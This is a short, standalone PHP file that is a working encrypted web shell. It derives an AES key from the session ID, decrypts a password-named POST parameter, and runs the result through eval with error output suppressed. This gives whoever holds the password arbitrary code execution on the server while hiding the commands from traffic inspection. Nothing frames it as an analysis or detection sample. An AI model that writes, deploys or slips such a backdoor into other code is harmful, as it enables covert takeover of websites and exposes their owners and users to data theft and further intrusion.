<?php
@session_start();
$pwd='hanyangui';
$key=substr(str_pad(session_id(),32,'a'),0,32);
$iv=$key;
@eval(openssl_decrypt(base64_decode($_POST[$pwd]), 'AES-256-CFB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING, $iv));
?>